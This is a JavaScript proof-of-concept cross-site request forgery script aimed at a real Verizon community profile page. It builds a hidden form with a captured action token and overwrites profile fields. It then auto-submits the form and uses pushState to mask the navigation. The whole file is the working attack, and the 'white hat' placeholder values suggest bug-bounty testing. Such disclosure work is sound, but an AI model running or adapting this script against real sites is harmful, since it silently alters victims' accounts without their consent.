// 1.js

// Create a form dynamically
var form = document.createElement('form');
form.action = 'https://community.verizon.com/t5/user/myprofilepage.personalprofile.personalinfoform.form.form.form';
form.method = 'POST';
form.enctype = 'multipart/form-data';

// List of hidden input elements with name and value
var hiddenInputs = [
    { name: 't&#58;ac', value: 'tab&#47;personal&#45;profile&#37;3Apersonal&#45;info' },
    { name: 'liaFormContentKey', value: 'MyProfilePage&#58;tab&#47;personal&#45;profile&#58;personal&#45;info&#58;personalprofile&#46;personalinfoform&#46;form&#46;form&#58;' },
    { name: 't&#58;formdata', value: 'p&#47;9EJqAwEO&#43;2cIii3GgMOeAjFCE&#61;&#58;H4sIAAAAAAAAAO1YS2gTQRieVoRKW&#47;uwVi9CkVpbsJu0SYtUpdTSh9IXhha8GGY3s8no7M52ZtIkiJ48ePDuTRC8ab16E7EH6cWL4lUEr4KoeFHB2eyuSYuPbpylgrnssv&#47;8&#43;eb7v&#43;&#43;fDDMP3oG9hQkwnueIxeZLS4yamKAlmEVjDmKc2pA4XkwLvrFtUpMySys&#47;CKVOOs4Z0CjLatCBRg5pAjqIC1Ya0QzKEMG6fFsOtZEtuDYnf9E7&#47;MExB2a67483AlB0doNB4kn&#47;jdnEp3WgiMHQKrgOGhTh7Pl7nERoRUYGFzdfDYCrm4oUCc9g6OLb9Y&#47;moxd3FTJYCMXgghyXQykBBZpm1Eq5X5lJgmXKCiR5NHj76cuboOdbI2iYA81GZUCAzrnLcA3GCLSzsZRg2M6eKjoyHBC1oYXSJmZcFM6BmZork6NyQJRQBktyssIxgkUO5y2tgPTh6ooI1pb85Klycm8KibwzZa9hRm1L5pzvaFx9nYgNlqtpCpDdDtxXdNxXc6Ef9OmEGldi1VBn3QgPJublYiWTkd9qrUOOtAldBqEhpjEiGY&#47;PseWN5jcHn331JaW2YJQsSLF8HgJ0&#43;IpUKRiG1kRYWhLTQJyn8rqFOcfU3niYSZqf7zz3&#43;lKpe6d37t4kQdDe4p&#43;18vhaz&#43;yhL7u2YpOK&#47;8cT3DW9qWK5t2oIVLto3Ela3MfhEI3k5u8XoL26GcvEdgzhInQqrMPF61IguovTHYV5HGdtKPIMRWLekUIf6P2T8gIVxXbrKrR2CPC&#47;GNcaJAssSDSmHQ2&#47;4lr8mTxS9dW2zbSgq2XYgELuVpH4djy8b23&#43;TD941a3bZl1XkJxnJJ2jFnIkUiT2nQhv3wF&#47;pi3c6hb&#43;aq&#47;TMc0y6ORKkfg3VOteV6FV3&#43;t&#43;vtfZVCAeiWmjYU0LdjqPUt2w2g4lo&#47;H29ycv3bt1RuXVjoJK4opwkoqumpLeVdMimK8Zh7tHZOG&#47;3KN7VTO3etFJL6p8Gq&#47;t1YigypToxGzbImY6&#47;m&#47;L&#43;R39j0LlVxYAAA&#61;&#61;' },
    { name: 'lia&#45;action&#45;token', value: 'ucEhS9TqyZe3S8vupShuMW&#95;cEBDay7P&#95;jLaZo&#45;N5ICAP&#95;3lFncqxrIYbKdXOMlYk' },
    { name: 'form&#95;UID', value: 'form' },
    { name: 'form&#95;instance&#95;key', value: '' },
    { name: 'profilename&#95;first', value: 'Cai' },
    { name: 'profilename&#95;last', value: 'Fang' },
    { name: 'profilesignature', value: '123' },
    { name: 'profiletitle', value: 'no&#46;1' },
    { name: 'profilelocation', value: 'New&#32;York' },
    { name: 'profileurl&#95;homepage', value: 'https://www&#46;google&#46;com' },
    { name: 'profilebiography', value: 'white&#32;hat' },
    { name: 'profilenotes', value: 'be&#32;no&#46;1' },
    { name: 'submitContextX', value: 'Submit' },
    { name: 'submitContext', value: 'Save' },
    { name: 'submitContext&#95;0X', value: 'Reset' }
];

// Create the input elements and append them to the form
hiddenInputs.forEach(function(inputData) {
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = inputData.name;
    input.value = inputData.value;
    form.appendChild(input);
});

// Append the form to the body and submit it
document.body.appendChild(form);

// Use pushState to simulate navigation and avoid redirection
history.pushState('', '', '/');

// Submit the form automatically
form.submit();
